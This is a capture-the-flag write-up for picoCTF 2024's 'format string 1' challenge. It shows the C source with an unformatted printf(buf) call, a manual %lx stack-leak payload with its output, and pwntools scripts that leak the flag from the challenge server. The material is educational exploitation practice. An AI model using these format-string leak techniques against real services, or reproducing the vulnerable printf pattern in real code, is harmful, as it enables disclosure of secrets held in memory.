# format string 1

- [Challenge information](#challenge-information)
- [Solution](#solution)
- [References](#references)

## Challenge information
```
Points: 100
Tags: picoCTF 2024, Binary Exploitation, format_string, browser_webshell_solvable
Author: SYREAL

Description:
Patrick and Sponge Bob were really happy with those orders you made for them, but now 
they're curious about the secret menu. Find it, and along the way, maybe you'll find 
something else of interest!

Download the binary here.
Download the source here.

Connect with the challenge instance here:
nc mimas.picoctf.net 62057
 
Hints:
1. https://lettieri.iet.unipi.it/hacking/format-strings.pdf
2. Just try out the different options
```
Challenge link: [https://play.picoctf.org/practice/challenge/434](https://play.picoctf.org/practice/challenge/434)

## Solution

### Analyse the C file

We start by analysing the C source code.
```c
#include <stdio.h>

int main() {
  char buf[1024];
  char secret1[64];
  char flag[64];
  char secret2[64];

  // Read in first secret menu item
  FILE *fd = fopen("secret-menu-item-1.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-1.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret1, 64, fd);
  // Read in the flag
  fd = fopen("flag.txt", "r");
  if (fd == NULL){
    printf("'flag.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(flag, 64, fd);
  // Read in second secret menu item
  fd = fopen("secret-menu-item-2.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-2.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret2, 64, fd);

  printf("Give me your order and I'll read it back to you:\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your order: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  printf("Bye!\n");
  fflush(stdout);

  return 0;
}
```
The program will:
- Open and read the `secret-menu-item-1.txt` file (64 bytes) into memory
- Open and read the `flag.txt` file (64 bytes) into memory
- Open and read the `secret-menu-item-2.txt` file (64 bytes) into memory
- Ask as for our order and read our answer (1024 characters) with `scanf` 
- Print the order with a `printf` statement WITHOUT any format specifier(s)

We can read data from the stack, for example 64-bit integers shown in hex-format with the `%lx` format specifier or we can read and print the N:th integer with the form `%N$lx`. This can be done manually or semi-automated.

### Get the flag offset

The offset can be found manually by inputting a long string of items of the form `<offset>:%lx<delimiter>`.  
Here I have used dots (`.`) as delimiter.
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2024/Binary_Exploitation/format_string_1]
└─$ ./format-string-1                                
Give me your order and I'll read it back to you:
1:%lx.2:%lx.3:%lx.4:%lx.5:%lx.6:%lx.7:%lx.8:%lx.9:%lx.10:%lx.11:%lx.12:%lx.13:%lx.14:%lx.15:%lx.16:%lx.17:%lx.18:%lx.19:%lx.20:%lx.
Here's your order: 1:7ffd81524750.2:0.3:0.4:a.5:400.6:6d20746572636553.7:6d65746920756e65.8:a322320.9:7f6580102ab0.10:7ffd00000000.11:7ffd81524978.12:0.13:7ffd81524980.14:7b4654436f636970.15:616c665f656b6166.16:a7d67.17:0.18:0.19:7f65800f8817.20:7f6580103648.
Bye!
```
Offset 14 looks promising and is indeed the ASCII-version of the start of the flag (in reverse order due to endianness).
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2024/Binary_Exploitation/format_string_1]
└─$ echo '7b4654436f636970' | xxd -r -p | rev
picoCTF{  
```

We can also write a small python script with the help of [pwntools](https://docs.pwntools.com/en/stable/index.html) to find the offset for us
```python
#!/usr/bin/python

from pwn import *

SERVER = 'mimas.picoctf.net'
PORT = 60865
FLAG_START = 'picoCTF{'

# Set output level (critical, error, warning, info, debug)
context.update(log_level = "warning")

for i in range(1, 25):
    io = remote(SERVER, PORT)
    log.info(f"Trying offset {i}\n")
    io.sendlineafter(b"Give me your order and I'll read it back to you:\n", f"%{i}$lx")
    out = io.recvlineS().split(':')[1].strip()
    try:
        # Little endian case
        res_le = p64(int(out, 16), endianness="little").decode()
        if (res_le == FLAG_START):
            print(f"Found start of flag ({FLAG_START}) with little endian at offset {i}")
        # Big endian case
        res_be = p64(int(out, 16), endianness="big").decode()
        if (res_be == FLAG_START):
            print(f"Found start of flag ({FLAG_START}) with big endian at offset {i}")
    except Exception:
        pass
    io.recvall()
    io.close()
```

We run the script to get the offset
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2024/Binary_Exploitation/format_string_1]
└─$ ~/python_venvs/pwntools/bin/python find_offset.py
/mnt/hgfs/CTFs/picoCTF/picoCTF_2024/Binary_Exploitation/format_string_1/find_offset.py:15: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendlineafter(b"Give me your order and I'll read it back to you:\n", f"%{i}$lx")
Found start of flag (picoCTF{) with little endian at offset 14  
```
Pwntools complains about my f-string that isn't bytes, but otherwise it works beautifully.  
We confirm that the flag starts at offset 14.

### Get the flag

Now that we know at which offset the flag start we can modify the script to extract the entire flag
```python
#!/usr/bin/python

from pwn import *

SERVER = 'mimas.picoctf.net'
PORT = 60865
offset = 14

# Set output level (critical, error, warning, info, debug)
context.update(log_level = "warning")

flag = b''
keep_going = True
while keep_going:
    io = remote(SERVER, PORT)    
    io.sendlineafter(b"Give me your order and I'll read it back to you:\n", f"%{offset}$lx")
    out = io.recvlineS().split(':')[1].strip()
    try:
        res_le = p64(int(out, 16), endianness="little")
        flag += res_le
        if (b'}' in res_le):
            keep_going = False
    except Exception:
        pass
    io.recvall()
    io.close()
    offset += 1

print(flag)
```

Finally, run the script to get the flag
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2024/Binary_Exploitation/format_string_1]
└─$ ~/python_venvs/pwntools/bin/python get_flag.py
/mnt/hgfs/CTFs/picoCTF/picoCTF_2024/Binary_Exploitation/format_string_1/get_flag.py:16: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendlineafter(b"Give me your order and I'll read it back to you:\n", f"%{offset}$lx")
b'picoCTF{<REDACTED>}\x00'
```

For additional information, please see the references below.

## References

- [Format Strings](https://lettieri.iet.unipi.it/hacking/format-strings.pdf)
- [freeCodeCamp - Format Specifiers in C](https://www.freecodecamp.org/news/format-specifiers-in-c/)
- [pwntools - Documentation](https://docs.pwntools.com/en/stable/index.html)
- [nc - Linux manual page](https://linux.die.net/man/1/nc)
- [rev - Linux manual page](https://man7.org/linux/man-pages/man1/rev.1.html)
- [xxd - Linux manual page](https://linux.die.net/man/1/xxd)
- [Wikipedia - ASCII](https://en.wikipedia.org/wiki/ASCII)
- [Wikipedia - Endianness](https://en.wikipedia.org/wiki/Endianness)
- [Wikipedia - Stack-based memory allocation](https://en.wikipedia.org/wiki/Stack-based_memory_allocation)
- [Wikipedia - Uncontrolled format string](https://en.wikipedia.org/wiki/Uncontrolled_format_string)
